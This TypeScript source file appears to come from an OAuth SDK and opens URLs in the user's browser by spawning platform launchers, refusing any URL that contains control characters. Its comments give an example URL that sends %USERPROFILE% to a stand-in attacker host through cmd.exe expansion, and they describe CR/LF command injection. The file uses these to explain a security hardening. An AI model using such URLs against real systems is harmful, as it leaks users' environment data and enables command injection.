import { spawn } from 'node:child_process'

/**
 * C0 controls and DEL, which no URL has any business carrying.
 *
 * The URL syntax has percent-encoding for every byte that needs one, so a
 * literal control character in a URL is never the author's intent — it is
 * either corruption or a line break someone wants a downstream parser to act
 * on. The WHATWG URL parser makes that worse rather than better: it strips TAB,
 * CR and LF as a silent repair, so a value containing them can pass a
 * `new URL(…).protocol` check and still reach a launcher with the break intact.
 */
const CONTROL_CHARACTERS = /[\u0000-\u001F\u007F]/

/**
 * Whether launching a browser has been switched off for this process.
 *
 * Set `AI_OAUTH_SDK_NO_BROWSER` in a test suite or a CI job that drives a login
 * end to end. Without it every completed flow spawns the machine's URL handler,
 * which on a developer's laptop means a tab per test pointing at a port that
 * closed when the fixture did.
 */
function browserDisabled(): boolean {
  return Boolean(process.env['AI_OAUTH_SDK_NO_BROWSER'])
}

/**
 * Opens a URL in the user's default browser.
 *
 * Implemented with `spawn` rather than a dependency like `open` to keep the
 * package dependency-free. Uses argument arrays (never a shell string), so the
 * URL reaches the launcher untouched on every platform.
 *
 * ## Why Windows no longer goes through `cmd.exe`
 *
 * `start` is a `cmd` builtin, so launching with it meant spawning `cmd /c start
 * "" <url>` — and `cmd` re-parses the command line *after* the child-process
 * layer has built it. That second parse was the whole problem, and it could not
 * be escaped away:
 *
 * - `escapeForCmd` prefixed `&|^<>()` with `^`, which handled the metacharacter
 *   every authorization URL is full of. It could not handle `%`. `^` does not
 *   escape `%` in `cmd`, there is no sequence that does on a command line, and
 *   so `https://evil.test/?x=%USERPROFILE%` had the variable expanded before
 *   the browser ever saw it — sending the user's home path, or `%PATH%`, or any
 *   other environment variable, to the attacker's server the moment the tab
 *   opened. That gap was known and documented as "deliberately left alone".
 * - `^` does not escape CR or LF either. A carriage return in the command line
 *   ends one command and starts the next, so a URL carrying one is command
 *   injection outright, and the URL is not always ours: `providerFromDiscovery`
 *   takes `authorization_endpoint` from a remote document, and the URL parser
 *   strips CR and LF while validating, so the string that was checked and the
 *   string that arrived here were not the same string.
 *
 * Neither is a patch to the escaping. They are both consequences of handing a
 * URL to a shell at all, so the shell is gone. `rundll32 url.dll,
 * FileProtocolHandler <url>` is Microsoft's documented way to open a URL with
 * the registered handler; it receives the URL as an argv entry, performs no
 * re-parse, expands no `%VAR%`, and has no notion of a command separator.
 *
 * The control-character refusal below is belt-and-braces for the same class of
 * input, and stays because it is not Windows-specific: `xdg-open` is a shell
 * script, and a URL is not a place a control character can arrive innocently.
 */
export function openBrowser(url: string): void {
  if (browserDisabled()) {
    return
  }

  // No spawn at all rather than a sanitised one. Every URL this library builds
  // itself is already clean, so a control character here means the value came
  // from somewhere that should not have been trusted with it, and quietly
  // repairing it would hide that. The caller falls back to printing the URL,
  // which is a working login rather than a broken one.
  if (CONTROL_CHARACTERS.test(url)) {
    return
  }

  const platform = process.platform

  let command: string
  let args: string[]

  if (platform === 'darwin') {
    command = 'open'
    args = [url]
  } else if (platform === 'win32') {
    command = 'rundll32'
    args = ['url.dll,FileProtocolHandler', url]
  } else {
    command = 'xdg-open'
    args = [url]
  }

  try {
    const child = spawn(command, args, { stdio: 'ignore', detached: true })
    child.on('error', () => {})
    child.unref()
  } catch {
    /* caller falls back to printing the URL */
  }
}

/** True when there is plausibly a browser to open (i.e. not a headless box). */
export function canOpenBrowser(): boolean {
  if (browserDisabled()) {
    return false
  }

  if (process.platform === 'darwin' || process.platform === 'win32') {
    return true
  }

  return Boolean(process.env['DISPLAY'] ?? process.env['WAYLAND_DISPLAY'])
}
